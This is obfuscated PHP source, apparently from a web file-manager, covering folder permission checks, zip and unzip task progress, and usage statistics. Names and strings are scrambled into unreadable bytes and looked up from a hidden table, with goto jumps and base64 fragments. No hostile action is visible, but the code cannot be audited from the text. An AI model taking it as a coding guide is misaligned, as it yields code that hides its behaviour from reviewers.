$this->sourceAuthSelect($ßó„“‘’[$üš ¶[87]][$üš ¶[399]]); $Û”ïâ®ä = $ß¼úáµú ? $this->authMake($ß¼úáµú, $ìÖŞÅù¦) : !1; $©»’² = $Û”ïâ®ä ? $Û”ïâ®ä[$üš ¶[462]] : !1; $…’¿ÊŸ÷[$Ä´Ş´«ı] = $©»’² ? $©»’² : $éÏ°¤å«; return $…’¿ÊŸ÷[$Ä´Ş´«ı]; } public function authOwnerApply($¡¯÷Ì³) { $â¥ò–î =& $_SERVER[Ôó‡è­ƒ]; if (empty($¡¯÷Ì³[$â¥ò–î[410]]) || isset($¡¯÷Ì³[$â¥ò–î[2025]]) && $¡¯÷Ì³[$â¥ò–î[2025]]) { return $¡¯÷Ì³; } if (AuthModel::authCheckRoot($¡¯÷Ì³[$â¥ò–î[410]][$â¥ò–î[411]])) { return $¡¯÷Ì³; } $£²Ÿª”Ñ = Model($â¥ò–î[1325])->parentLevelArray($¡¯÷Ì³[$â¥ò–î[517]]); $£²Ÿª”Ñ = array_merge(array($¡¯÷Ì³[$â¥ò–î[399]]), array_reverse($£²Ÿª”Ñ)); $ıÇí˜øŒ = $this->sourceAuthSelect($£²Ÿª”Ñ); $—¹Ú½Á° = array(); $¸Ÿî±÷Å = array(); foreach ($ıÇí˜øŒ as $îòÑ–ÁÃ => $ĞæõÀú§) { $—º™à…  = $this->authFolderOwnerUser($ĞæõÀú§); $—¹Ú½Á°[$îòÑ–ÁÃ] = $—º™à… ; $¸Ÿî±÷Å = array_merge($¸Ÿî±÷Å, $—º™à… [$â¥ò–î[593]]); if ($—º™à… [$â¥ò–î[2026]]) { break; } } if (count($¸Ÿî±÷Å) == 0) { $¸Ÿî±÷Å = $this->authFolderOwnerGroup($¡¯÷Ì³[$â¥ò–î[501]]); } $¸Ÿî±÷Å = array_unique($¸Ÿî±÷Å); if (AuthModel::authCheckRoot($¡¯÷Ì³[$â¥ò–î[410]][$â¥ò–î[411]])) { $¸Ÿî±÷Å[] = USER_ID; } $¡¯÷Ì³[$â¥ò–î[410]][$â¥ò–î[2027]] = Model($â¥ò–î[509])->userListInfo($¸Ÿî±÷Å); return $¡¯÷Ì³; } private function authFolderOwnerGroup($ûØ™í) { $‹ªàƒ®ß =& $_SERVER[Ôó‡è­ƒ]; $§şÄÏƒ = Model($‹ªàƒ®ß[1912])->where(array($‹ªàƒ®ß[1823] => $ûØ™í))->select(); $æß¡º¸€ = array(); if (!$§şÄÏƒ) { return $æß¡º¸€; } foreach ($§şÄÏƒ as $´íƒ°’æ) { $¬Ûê‹ ‹ = $this->authInfo($´íƒ°’æ); if (AuthModel::authCheckRoot($¬Ûê‹ ‹[$‹ªàƒ®ß[410]])) { $æß¡º¸€[] = $´íƒ°’æ[$‹ªàƒ®ß[1655]]; } } return $æß¡º¸€; } private function authFolderOwnerUser($ƒÖ¹ùƒ©) { $áµË‡Œå =& $_SERVER[Ôó‡è­ƒ]; $ôù‹Æ¿ = array(); $²îİ¿¬Æ = !1; foreach ($ƒÖ¹ùƒ© as $¤µ®ôŠ) { $ÈÖŸã¸ü = $this->authInfo($¤µ®ôŠ); if ($¤µ®ôŠ[$áµË‡Œå[501]] == $áµË‡Œå[194]) { $²îİ¿¬Æ = !0; } if ($¤µ®ôŠ[$áµË‡Œå[408]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ÈÖŸã¸ü[$áµË‡Œå[410]])) { $ôù‹Æ¿[] = $¤µ®ôŠ[$áµË‡Œå[501]]; } } } return array($áµË‡Œå[593] => $ôù‹Æ¿, $áµË‡Œå[2026] => $²îİ¿¬Æ); } public function authMake($‹ú°ûçá, $üÛÏ«ƒ = false) { $Î¹ºãóÜ =& $_SERVER[Ôó‡è­ƒ]; $êòØ£ĞŞ = $this->authArrayCheck($‹ú°ûçá, $üÛÏ«ƒ); if ($êòØ£ĞŞ[$Î¹ºãóÜ[2028]]) { $êòØ£ĞŞ[$Î¹ºãóÜ[2028]] = $this->sourceAuthInfo($êòØ£ĞŞ[$Î¹ºãóÜ[2028]]); } return $êòØ£ĞŞ; } public function authArrayCheck($ˆó½™, $×‹‹ú—ó = false) { $—×§Ç° =& $_SERVER[Ôó‡è­ƒ]; if (!$ˆó½™) { return array($—×§Ç°[411] => 0, $—×§Ç°[462] => !1); } $×‹‹ú—ó = $×‹‹ú—ó ? $×‹‹ú—ó : USER_ID; $Ú¹Ã¯èƒ = 0; $Çº­³ş = 0; $Æš×¸€å = 0; $ŒÂİã¨Ä = 0; $ß†ğïäÍ = 0; $é·èšòÂ = 0; $ÈàÎèö± = 1000; $ İô€ = 0; $ÊÅ©Ê’· = 0; $úìğ­ = 0; $ìŸÈ¡È = 0; $ÀëÇı¯ö = array($—×§Ç°[399] => 0); foreach ($ˆó½™ as $ÀëÇı¯ö) { $Ü³Ş™ˆá = $this->authInfo($ÀëÇı¯ö); if (!$Ü³Ş™ˆá) { continue; } $ƒ›ªÜÚç = $ÀëÇı¯ö[$—×§Ç°[501]]; $Òğ²¸Ğ = intval($Ü³Ş™ˆá[$—×§Ç°[410]]); if ($ÀëÇı¯ö[$—×§Ç°[408]] == SourceModel::TYPE_USER && $ƒ›ªÜÚç == $×‹‹ú—ó) { $Ú¹Ã¯èƒ = !0; $Æš×¸€å = $Ü³Ş™ˆá; $Çº­³ş = $Òğ²¸Ğ; } else { if ($ÀëÇı¯ö[$—×§Ç°[408]] == SourceModel::TYPE_GROUP && $this->groupContainUser($ƒ›ªÜÚç, $×‹‹ú—ó)) { $ŒÂİã¨Ä = !0; $ÄäŞûÀï = $this->groupStepToUserGroup($ƒ›ªÜÚç, $×‹‹ú—ó); if ($ÄäŞûÀï < $ÈàÎèö±) { $ÈàÎèö± = $ÄäŞûÀï; $ß†ğïäÍ = $Òğ²¸Ğ; $é·èšòÂ = $Ü³Ş™ˆá; $ İô€ = $ƒ›ªÜÚç; } if ($ÄäŞûÀï == $ÈàÎèö± && $Òğ²¸Ğ >= $ß†ğïäÍ) { $ß†ğïäÍ = $Òğ²¸Ğ; $é·èšòÂ = $Ü³Ş™ˆá; $ İô€ = $ƒ›ªÜÚç; } } else { if ($ƒ›ªÜÚç == $—×§Ç°[194]) { $ÊÅ©Ê’· = !0; $ìŸÈ¡È = $Ü³Ş™ˆá; $úìğ­ = $Òğ²¸Ğ; } } } } if ($Ú¹Ã¯èƒ) { $ø‚éú™· = $Çº­³ş; $Ü³Ş™ˆá = $Æš×¸€å; $ÁÕ‘Ş…ˆ = LNG($—×§Ç°[2029]); } else { if ($ŒÂİã¨Ä) { $ø‚éú™· = $ß†ğïäÍ; $Ü³Ş™ˆá = $é·èšòÂ; $‰Ñà±óÇ = Model($—×§Ç°[518])->getInfo($ İô€); $ÁÕ‘Ş…ˆ = $—×§Ç°[163] . $‰Ñà±óÇ[$—×§Ç°[522]] . $—×§Ç°[2030] . LNG($—×§Ç°[2031]); } else { if ($ÊÅ©Ê’·) { $ø‚éú™· = $úìğ­; $Ü³Ş™ˆá = $ìŸÈ¡È; $ÁÕ‘Ş…ˆ = LNG($—×§Ç°[2002]); } else { $ø‚éú™· = 0; $Ü³Ş™ˆá = !1; $ÁÕ‘Ş…ˆ = $—×§Ç°[12]; } } } $Å•Œğ = array($—×§Ç°[2021] => intval($ø‚éú™·), $—×§Ç°[2005] => $Ü³Ş™ˆá, $—×§Ç°[2022] => $ÁÕ‘Ş…ˆ, $—×§Ç°[2014] => $ÀëÇı¯ö[$—×§Ç°[399]]); return $Å•Œğ; } private function groupContainUser($“ñŞòÄÍ, $ı¤æö»  = false) { return in_array($“ñŞòÄÍ, $this->userGroupParents($ı¤æö» )); } private function groupStepToUserGroup($¹°èåœ×, $ä§©ãÔè = false) { $…™ È®÷ =& $_SERVER[Ôó‡è­ƒ]; $±Á¾áˆŒ = $this->userGroupList($ä§©ãÔè); $¡¾èÏµÕ = 1000; $Ç’ş¼Æ = $GLOBALS[$…™ È®÷[6]][$…™ È®÷[90]][$…™ È®÷[1925]] == 1; $Ÿ€¾Ì¼ = $Ç’ş¼Æ ? 3 : 2; foreach ($±Á¾áˆŒ as $§›Ü‹¢§) { if ($§›Ü‹¢§[$…™ È®÷[1823]] == $¹°èåœ×) { return 0; } $Ò»è·ìİ = explode($…™ È®÷[50], trim($§›Ü‹¢§[$…™ È®÷[517]], $…™ È®÷[50])); if ($Ò»è·ìİ[0] == $…™ È®÷[194] && count($Ò»è·ìİ) > $Ÿ€¾Ì¼) { $ú¶ø‰Ê = array_reverse(array_slice($Ò»è·ìİ, $Ÿ€¾Ì¼)); $úºäşáç = array_search($¹°èåœ×, $ú¶ø‰Ê); if ($úºäşáç !== !1 && $úºäşáç + 1 <= $¡¾èÏµÕ) { $¡¾èÏµÕ = $úºäşáç + 1; } } } return $¡¾èÏµÕ; } private function userGroupList($ØÀ¼Ë†› = false) { $îº¸ó£˜ =& $_SERVER[Ôó‡è­ƒ]; static $ä„âÄ¤ = array(); if (isset($ä„âÄ¤[$ØÀ¼Ë†›])) { return $ä„âÄ¤[$ØÀ¼Ë†›]; } $æÌ·ùÒÊ = Model($îº¸ó£˜[537])->getInfo($ØÀ¼Ë†›); $ä„âÄ¤[$ØÀ¼Ë†›] = array_to_keyvalue($æÌ·ùÒÊ[$îº¸ó£˜[2003]], $îº¸ó£˜[1823]); return $ä„âÄ¤[$ØÀ¼Ë†›]; } public function userGroupParents($·¿òÀ³°) { $¸‡¾ˆ¶Ã =& $_SERVER[Ôó‡è­ƒ]; static $Ï½ÙÒôÚ = array(); $·¿òÀ³° = $·¿òÀ³° ? $·¿òÀ³° : USER_ID; if (isset($Ï½ÙÒôÚ[$·¿òÀ³°])) { return $Ï½ÙÒôÚ[$·¿òÀ³°]; } $Ì·æáğ = $this->userGroupList($·¿òÀ³°); $üò›óµÊ = array(); $¼õ¡·ßÒ = $GLOBALS[$¸‡¾ˆ¶Ã[6]][$¸‡¾ˆ¶Ã[90]][$¸‡¾ˆ¶Ã[1925]] == 1; $Œ¨Æ‚ş = $¼õ¡·ßÒ ? 3 : 2; foreach ($Ì·æáğ as $±Šå§İª) { $ªÀ£õíÔ = array($±Šå§İª[$¸‡¾ˆ¶Ã[1823]]); $ÉÃÀôöñ = explode($¸‡¾ˆ¶Ã[50], trim($±Šå§İª[$¸‡¾ˆ¶Ã[517]], $¸‡¾ˆ¶Ã[50])); if ($ÉÃÀôöñ[0] == $¸‡¾ˆ¶Ã[194] && count($ÉÃÀôöñ) > $Œ¨Æ‚ş) { $ş´­ìŸ† = array_slice($ÉÃÀôöñ, $Œ¨Æ‚ş); $ªÀ£õíÔ = array_merge($ªÀ£õíÔ, array_reverse($ş´­ìŸ†)); } $üò›óµÊ = array_merge($üò›óµÊ, $ªÀ£õíÔ); } $Ï½ÙÒôÚ[$·¿òÀ³°] = array_unique($üò›óµÊ); return $Ï½ÙÒôÚ[$·¿òÀ³°]; } public function authTargetInfoMake($•‚öË®) { $ÚĞ˜ƒ‹¦ =& $_SERVER[Ôó‡è­ƒ]; $Ê¨ÈÊ˜è = array(); $€ıÓ©¿ö = array(); foreach ($•‚öË® as $ÓÉ…âß) { if ($ÓÉ…âß[$ÚĞ˜ƒ‹¦[408]] == SourceModel::TYPE_USER) { $Ê¨ÈÊ˜è[] = intval($ÓÉ…âß[$ÚĞ˜ƒ‹¦[501]]); } else { if ($ÓÉ…âß[$ÚĞ˜ƒ‹¦[408]] == SourceModel::TYPE_GROUP) { $€ıÓ©¿ö[] = intval($ÓÉ…âß[$ÚĞ˜ƒ‹¦[501]]); } } } if ($Ê¨ÈÊ˜è) { $Ê¨ÈÊ˜è = Model($ÚĞ˜ƒ‹¦[509])->userListInfo($Ê¨ÈÊ˜è); } if ($€ıÓ©¿ö) { $õ Æ”× = array($ÚĞ˜ƒ‹¦[1910] => array($ÚĞ˜ƒ‹¦[415], $€ıÓ©¿ö)); $€ıÓ©¿ö = Model($ÚĞ˜ƒ‹¦[518])->field($ÚĞ˜ƒ‹¦[2032])->where($õ Æ”×)->select(); $€ıÓ©¿ö = array_to_keyvalue($€ıÓ©¿ö, $ÚĞ˜ƒ‹¦[1823]); } return array($ÚĞ˜ƒ‹¦[2033] => $Ê¨ÈÊ˜è, $ÚĞ˜ƒ‹¦[2034] => $€ıÓ©¿ö); } public function authInfo($ìúÏŞ±†) { $»ÜİÆÏã =& $_SERVER[Ôó‡è­ƒ]; if ($ìúÏŞ±†[$»ÜİÆÏã[1926]]) { $¹ĞƒĞ» = Model($»ÜİÆÏã[503])->listData($ìúÏŞ±†[$»ÜİÆÏã[1926]]); if (!$¹ĞƒĞ») { return !1; $Ûí€Í· = Model($»ÜİÆÏã[503])->listData(); $‰ë¾à”» = array_filter_by_field($Ûí€Í·, $»ÜİÆÏã[410], $»ÜİÆÏã[194]); return $‰ë¾à”»; } $ÉÛ·¥Ìè = array_field_key($¹ĞƒĞ», array($»ÜİÆÏã[396], $»ÜİÆÏã[32], $»ÜİÆÏã[410], $»ÜİÆÏã[1845], $»ÜİÆÏã[1846])); $ÉÛ·¥Ìè[$»ÜİÆÏã[2035]] = $ìúÏŞ±†; return $ÉÛ·¥Ìè; } else { return array($»ÜİÆÏã[416] => 0, $»ÜİÆÏã[1829] => $ìúÏŞ±†[$»ÜİÆÏã[1980]], $»ÜİÆÏã[417] => $»ÜİÆÏã[12], $»ÜİÆÏã[1845] => $»ÜİÆÏã[2036]); } } } goto EëàÊ‘Øç; B›»¸Û‰‡Æ: function binCheckBigger($†Âí¡Ø, $òçÌåº¾) { return $†Âí¡Ø > $òçÌåº¾; } $_SERVER[$_SERVER[‡‹á¼¢¼][3]] = (base64_decode('ODAzMQ==').base64_decode('Njk='))+0;$_1x9e="nzabgf0pmuyxwe6h1ok973vd8ic5l4q2strjz7lfg2h0k96ejvp1i5yqcn";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ÈÎ¥³øÅ, $Ò—ò×Í) { $‚ŒìµŸø =& $_SERVER[Ôó‡è­ƒ]; if (isset(self::$_methodList[$ÈÎ¥³øÅ])) { return @call_user_func_array(self::$_methodList[$ÈÎ¥³øÅ], $Ò—ò×Í); } else { if (method_exists($this, $ÈÎ¥³øÅ)) { return call_user_func_array(array($this, $ÈÎ¥³øÅ), $Ò—ò×Í); } else { think_exception(__CLASS__ . $‚ŒìµŸø[4] . $ÈÎ¥³øÅ . $‚ŒìµŸø[5]); } } } public static function __callStatic($«ùºŞ½«, $„¿È”ÑÒ) { if (isset(self::$_methodListStatic[$«ùºŞ½«])) { return call_user_func_array(self::$_methodListStatic[$«ùºŞ½«], $„¿È”ÑÒ); } else { if (method_exists(self, $«ùºŞ½«)) { return call_user_func_array(array(self, $«ùºŞ½«), $„¿È”ÑÒ); } else { show_json("{$«ùºŞ½«}\x28\x29\x20\x6e\x6f\164\40\145\170\151\x73\x74\x3b", !1); } } } public static function addMethod($æì·ê×ˆ, $¼Úß³Êü) { self::$_methodList[$æì·ê×ˆ] = $¼Úß³Êü; } public static function addMethodStatic($„ößËÓ, $¦¬èÅ•Ÿ) { self::$_methodListStatic[$„ößËÓ] = $¦¬èÅ•Ÿ; } } goto E‹Àèšåãœ; c°„Û¶”À«: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $š¥âğ¡™ =& $_SERVER[Ôó‡è­ƒ]; parent::startAfter(); Hook::bind($š¥âğ¡™[1744], array($this, $š¥âğ¡™[1745])); Hook::bind($š¥âğ¡™[1192], array($this, $š¥âğ¡™[1746])); $¶×àÃÏ =& $this->task; $¶×àÃÏ[$š¥âğ¡™[1747]] = $š¥âğ¡™[1197]; if (!$¶×àÃÏ[$š¥âğ¡™[1555]]) { $¶×àÃÏ[$š¥âğ¡™[1555]] = LNG($š¥âğ¡™[1748]); } } protected function endAfter() { $¾¼¡¾ÙÄ =& $_SERVER[Ôó‡è­ƒ]; parent::endAfter(); Hook::unbind($¾¼¡¾ÙÄ[1744], array($this, $¾¼¡¾ÙÄ[1745])); Hook::unbind($¾¼¡¾ÙÄ[1192], array($this, $¾¼¡¾ÙÄ[1746])); } public function updateAfter() { $¸ú×§¦š =& $_SERVER[Ôó‡è­ƒ]; $ã­”êûû =& $this->task; if (!$ã­”êûû[$¸ú×§¦š[784]] || !$ã­”êûû[$¸ú×§¦š[761]]) { return; } if ($ã­”êûû[$¸ú×§¦š[1747]] == $¸ú×§¦š[1197]) { $íŞ¶óØÉ = 0; if ($ã­”êûû[$¸ú×§¦š[1703]]) { $íŞ¶óØÉ = $ã­”êûû[$¸ú×§¦š[1704]] / $ã­”êûû[$¸ú×§¦š[1703]]; } $ã­”êûû[$¸ú×§¦š[1657]] = $íŞ¶óØÉ * 0.3; } else { if ($ã­”êûû[$¸ú×§¦š[1747]] == $¸ú×§¦š[312]) { $íŞ¶óØÉ = $ã­”êûû[$¸ú×§¦š[1656]] / $ã­”êûû[$¸ú×§¦š[784]]; $ã­”êûû[$¸ú×§¦š[1657]] = 0.3 + $íŞ¶óØÉ * 0.4; } else { if ($ã­”êûû[$¸ú×§¦š[1747]] == $¸ú×§¦š[108]) { $”ÀåØÄ† = 0; if ($ã­”êûû[$¸ú×§¦š[1705]] == $¸ú×§¦š[108]) { $”ÀåØÄ† = $ã­”êûû[$¸ú×§¦š[1704]]; } $íŞ¶óØÉ = ($ã­”êûû[$¸ú×§¦š[1708]] + $”ÀåØÄ†) / $ã­”êûû[$¸ú×§¦š[761]]; $ã­”êûû[$¸ú×§¦š[1657]] = 0.3 + 0.4 + $íŞ¶óØÉ * 0.3; } } } if ($ã­”êûû[$¸ú×§¦š[1657]] > 0) { $”Ä¯½Ï› = timeFloat() - $ã­”êûû[$¸ú×§¦š[1659]] - $ã­”êûû[$¸ú×§¦š[1662]]; $ã­”êûû[$¸ú×§¦š[1663]] = $”Ä¯½Ï› * (1 - $ã­”êûû[$¸ú×§¦š[1657]]) / $ã­”êûû[$¸ú×§¦š[1657]]; } } public function addFile($ç Äôó) { $ëş¯À•¨ =& $_SERVER[Ôó‡è­ƒ]; $ûÂâ”… =& $this->task; $Ş«„Ö¼» = IO::info($ç Äôó); $ûÂâ”…[$ëş¯À•¨[1701]] = $Ş«„Ö¼»[$ëş¯À•¨[32]]; $ûÂâ”…[$ëş¯À•¨[1703]] = $Ş«„Ö¼»[$ëş¯À•¨[80]]; $ûÂâ”…[$ëş¯À•¨[1704]] = 0; $ûÂâ”…[$ëş¯À•¨[1064]] = $ëş¯À•¨[1723]; $ûÂâ”…[$ëş¯À•¨[1705]] = $ëş¯À•¨[1197]; $ûÂâ”…[$ëş¯À•¨[761]] = $Ş«„Ö¼»[$ëş¯À•¨[80]]; $ûÂâ”…[$ëş¯À•¨[784]] = 1; $¨Úî†‰’ = 0; $ûÂâ”…[$ëş¯À•¨[1712]] = array($ëş¯À•¨[1713] => $¨Úî†‰’ + 1, $ëş¯À•¨[417] => $Ş«„Ö¼»[$ëş¯À•¨[32]], $ëş¯À•¨[78] => $Ş«„Ö¼»[$ëş¯À•¨[78]], $ëş¯À•¨[515] => $Ş«„Ö¼»[$ëş¯À•¨[515]] ? $Ş«„Ö¼»[$ëş¯À•¨[515]] : $Ş«„Ö¼»[$ëş¯À•¨[78]]); $this->update(); } public function unzipAfter($¿Í•‹¿«) { $äëĞªó´ =& $_SERVER[Ôó‡è­ƒ]; $ï’îı­ =& $this->task; $ï’îı­[$äëĞªó´[1747]] = $äëĞªó´[108]; $Úàëì© = IO::infoWithChildren($¿Í•‹¿«); $ìùÂò•§ = 0; $ï’îı­[$äëĞªó´[1712]] = array($äëĞªó´[1713] => $ìùÂò•§ + 1, $äëĞªó´[417] => $Úàëì©[$äëĞªó´[32]], $äëĞªó´[78] => $Úàëì©[$äëĞªó´[78]], $äëĞªó´[515] => $Úàëì©[$äëĞªó´[515]] ? $Úàëì©[$äëĞªó´[515]] : $Úàëì©[$äëĞªó´[78]]); if ($Úàëì©[$äëĞªó´[33]] == $äëĞªó´[196]) { $ï’îı­[$äëĞªó´[784]] = 1; } else { $ï’îı­[$äëĞªó´[784]] = $Úàëì©[$äëĞªó´[83]][$äëĞªó´[81]]; } $ï’îı­[$äëĞªó´[1064]] = $äëĞªó´[12]; $ï’îı­[$äëĞªó´[1705]] = 0; $ï’îı­[$äëĞªó´[1656]] = 0; $ï’îı­[$äëĞªó´[1703]] = 0; $ï’îı­[$äëĞªó´[1704]] = 0; $ï’îı­[$äëĞªó´[1701]] = $äëĞªó´[12]; $ï’îı­[$äëĞªó´[1708]] = 0; $ï’îı­[$äëĞªó´[761]] = $Úàëì©[$äëĞªó´[80]]; $this->update(); self::log($äëĞªó´[1749] . json_encode(array($ï’îı­, $Úàëì©))); } public function nameParse($‰„¼íèô) { $—É‹à¦› =& $_SERVER[Ôó‡è­ƒ]; $÷üè’»Ä =& $this->task; if ($÷üè’»Ä[$—É‹à¦›[1747]] == $—É‹à¦›[1197]) { $÷üè’»Ä[$—É‹à¦›[1747]] = $—É‹à¦›[312]; $÷üè’»Ä[$—É‹à¦›[1708]] = 0; $÷üè’»Ä[$—É‹à¦›[761]] = 0; } $Øü÷ÂÀƒ = get_path_this($‰„¼íèô); if (strstr($Øü÷ÂÀƒ, $—É‹à¦›[10])) { $÷üè’»Ä[$—É‹à¦›[1656]] += 1; $÷üè’»Ä[$—É‹à¦›[784]] += 1; } $÷üè’»Ä[$—É‹à¦›[1701]] = $‰„¼íèô; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $–í«Øú =& $_SERVER[Ôó‡è­ƒ]; parent::startAfter(); Hook::bind($–í«Øú[1750], array($this, $–í«Øú[1745])); $Ô‘š„Ú =& $this->task; $Ô‘š„Ú[$–í«Øú[1747]] = $–í«Øú[1197]; if (!$Ô‘š„Ú[$–í«Øú[1555]]) { $Ô‘š„Ú[$–í«Øú[1555]] = LNG($–í«Øú[1751]); } } protected function endAfter() { $„ĞÂşˆã =& $_SERVER[Ôó‡è­ƒ]; parent::endAfter(); Hook::unbind($„ĞÂşˆã[1750], array($this, $„ĞÂşˆã[1745])); } public function updateAfter() { $€û÷±ıˆ =& $_SERVER[Ôó‡è­ƒ]; $ÕıÚ¨… =& $this->task; if (!$ÕıÚ¨…[$€û÷±ıˆ[784]] || !$ÕıÚ¨…[$€û÷±ıˆ[761]]) { return; } if ($ÕıÚ¨…[$€û÷±ıˆ[1747]] == $€û÷±ıˆ[1197]) { $ÜÁ¶ÉÈ¿ = $ÕıÚ¨…[$€û÷±ıˆ[1704]]; if ($ÕıÚ¨…[$€û÷±ıˆ[1705]] != $€û÷±ıˆ[1197]) { $ÜÁ¶ÉÈ¿ = 0; } $Ô…ãóãÏ = ($ÕıÚ¨…[$€û÷±ıˆ[1708]] + $ÜÁ¶ÉÈ¿) / $ÕıÚ¨…[$€û÷±ıˆ[761]]; $ÕıÚ¨…[$€û÷±ıˆ[1657]] = $Ô…ãóãÏ * 0.3; } else { if ($ÕıÚ¨…[$€û÷±ıˆ[1747]] == $€û÷±ıˆ[312]) { $Ô…ãóãÏ = $ÕıÚ¨…[$€û÷±ıˆ[1656]] / $ÕıÚ¨…[$€û÷±ıˆ[784]]; $ÕıÚ¨…[$€û÷±ıˆ[1657]] = 0.3 + $Ô…ãóãÏ * 0.5; } else { if ($ÕıÚ¨…[$€û÷±ıˆ[1747]] == $€û÷±ıˆ[108]) { $Ô…ãóãÏ = 0; if ($ÕıÚ¨…[$€û÷±ıˆ[1703]]) { $Ô…ãóãÏ = $ÕıÚ¨…[$€û÷±ıˆ[1704]] / $ÕıÚ¨…[$€û÷±ıˆ[1703]]; } $ÕıÚ¨…[$€û÷±ıˆ[1657]] = 0.3 + 0.5 + $Ô…ãóãÏ * 0.2; } } } if ($ÕıÚ¨…[$€û÷±ıˆ[1657]] > 0) { $Òçôğ¯… = timeFloat() - $ÕıÚ¨…[$€û÷±ıˆ[1659]] - $ÕıÚ¨…[$€û÷±ıˆ[1662]]; $ÕıÚ¨…[$€û÷±ıˆ[1663]] = $Òçôğ¯… * (1 - $ÕıÚ¨…[$€û÷±ıˆ[1657]]) / $ÕıÚ¨…[$€û÷±ıˆ[1657]]; } } public function copyFileStart($‹Ğ®×³Ã, $ìèÎÃµ, $¤²«¢˜˜, $Áùˆ÷Œ, $®ÎÈ¥ã, $ºËÚ©À„) { $‚ÜÃ¬Š¥ =& $_SERVER[Ôó‡è­ƒ]; parent::copyFileStart($‹Ğ®×³Ã, $ìèÎÃµ, $¤²«¢˜˜, $Áùˆ÷Œ, $®ÎÈ¥ã, $ºËÚ©À„); $óª’øşü =& $this->task; if ($óª’øşü[$‚ÜÃ¬Š¥[1747]] == $‚ÜÃ¬Š¥[312]) { $óª’øşü[$‚ÜÃ¬Š¥[1747]] = $‚ÜÃ¬Š¥[108]; } $this->update(); } public function copyFileEnd($øÌØ†¡˜, $âÃ¿Æî×, $¡ü¬·‚¶, $ò»–Æ‘§, $íĞí–¿ê, $¤ªÍšØ) { $î•Ğ„õª =& $_SERVER[Ôó‡è­ƒ]; $»¹õ¾Ö÷ =& $this->task; $»¹õ¾Ö÷[$î•Ğ„õª[1704]] = $»¹õ¾Ö÷[$î•Ğ„õª[1703]]; $»¹õ¾Ö÷[$î•Ğ„õª[1708]] += $»¹õ¾Ö÷[$î•Ğ„õª[1703]]; $»¹õ¾Ö÷[$î•Ğ„õª[1705]] = $î•Ğ„õª[12]; $this->update(); } public function nameParse($ãœ÷Ä˜) { $ÅìõÃ½Ù =& $_SERVER[Ôó‡è­ƒ]; $ë÷İõŠÉ =& $this->task; if ($ë÷İõŠÉ[$ÅìõÃ½Ù[1656]] < $ë÷İõŠÉ[$ÅìõÃ½Ù[784]]) { $‡«ò¯û¸ = get_path_this($ãœ÷Ä˜); if (strstr($‡«ò¯û¸, $ÅìõÃ½Ù[10])) { $ë÷İõŠÉ[$ÅìõÃ½Ù[1656]] += 1; } } if ($ë÷İõŠÉ[$ÅìõÃ½Ù[1747]] == $ÅìõÃ½Ù[1197]) { $ë÷İõŠÉ[$ÅìõÃ½Ù[1747]] = $ÅìõÃ½Ù[312]; } $ë÷İõŠÉ[$ÅìõÃ½Ù[1701]] = $ãœ÷Ä˜; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ìâ†‰¥) { $„Ò˜–× =& $_SERVER[Ôó‡è­ƒ]; $šÔ¯ûÂ™ = array($„Ò˜–×[593] => array($„Ò˜–×[33] => $„Ò˜–×[1752], $„Ò˜–×[272] => array($„Ò˜–×[223], $„Ò˜–×[763], $„Ò˜–×[1753], $„Ò˜–×[1754])), $„Ò˜–×[1755] => array($„Ò˜–×[33] => $„Ò˜–×[1756], $„Ò˜–×[272] => array($„Ò˜–×[223], $„Ò˜–×[761], $„Ò˜–×[1757], $„Ò˜–×[1758], $„Ò˜–×[1759]))); if (!isset($šÔ¯ûÂ™[$Ìâ†‰¥])) { return !1; } $this->optionType = $šÔ¯ûÂ™[$Ìâ†‰¥][$„Ò˜–×[33]]; $this->field = $šÔ¯ûÂ™[$Ìâ†‰¥][$„Ò˜–×[272]]; return !0; } public function listData($áÀ¢ƒØ¬ = false, $Ëˆ¡­Øâ = "\155\157\x64\151\x66\x79\x54\x69\155\145", $¸¥ĞâÓµ = false) { return parent::listData($áÀ¢ƒØ¬, $Ëˆ¡­Øâ, $¸¥ĞâÓµ); } public function trendList($½âÆ„˜â) { $ë¥ÁĞ»â =& $_SERVER[Ôó‡è­ƒ]; $Ğâ óà› = $this->listData(); if ($Ğâ óà›) { $¬×¥î = end($Ğâ óà›); $ÜÄÇÔ°Œ = date($ë¥ÁĞ»â[1760], strtotime($ë¥ÁĞ»â[1761])); if ($¬×¥î[$ë¥ÁĞ»â[223]] == $ÜÄÇÔ°Œ) { return $Ğâ óà›; } $á°åğ®¦ = strtotime($¬×¥î[$ë¥ÁĞ»â[223]]); } if (!isset($á°åğ®¦)) { $ÓŸŠâá× = $½âÆ„˜â == $ë¥ÁĞ»â[593] ? $ë¥ÁĞ»â[537] : $ë¥ÁĞ»â[823]; $á°åğ®¦ = Model($ÓŸŠâá×)->min($ë¥ÁĞ»â[197]); } $À Ÿ«×İ = $ë¥ÁĞ»â[1762] . ucfirst($½âÆ„˜â); $€ê•†¬ = $this->dateList($á°åğ®¦); foreach ($€ê•†¬ as $ÜÄÇÔ°Œ) { $this->{$À Ÿ«×İ}($ÜÄÇÔ°Œ); } return $this->listData(); } private function dateList($öÒÎÈ–ù) { $äéá¥‚ß =& $_SERVER[Ôó‡è­ƒ]; $åß†İº = $öÒÎÈ–ù; $äŒÀ²Æ¬ = strtotime($äéá¥‚ß[1761]); $ˆ©ØÙ· = array(); while ($åß†İº <= $äŒÀ²Æ¬) { $ˆ©ØÙ·[] = date($äéá¥‚ß[1760], $åß†İº); $åß†İº = strtotime($äéá¥‚ß[1763], $åß†İº); } return $ˆ©ØÙ·; } public function _recordUser($Ä¶©³ÉÛ = '') { $†ıŒÈ¥Å =& $_SERVER[Ôó‡è­ƒ]; $é§©ŒŒ = strtotime(date($†ıŒÈ¥Å[1764], strtotime($Ä¶©³ÉÛ))); $ûÊ£¤š¬ = strtotime(date($†ıŒÈ¥Å[1765], strtotime($Ä¶©³ÉÛ))); $¦Ñ›Û”¶ = array($†ıŒÈ¥Å[197] => array($†ıŒÈ¥Å[1013], $ûÊ£¤š¬)); $É—úÚ¨÷ = Model($†ıŒÈ¥Å[537])->where($¦Ñ›Û”¶)->count($†ıŒÈ¥Å[1655]); $¦Ñ›Û”¶[$†ıŒÈ¥Å[197]] = array($†ıŒÈ¥Å[332], array($é§©ŒŒ, $ûÊ£¤š¬)); $”ë‘ãŞ± = Model($†ıŒÈ¥Å[537])->where($¦Ñ›Û”¶)->count($†ıŒÈ¥Å[1655]); 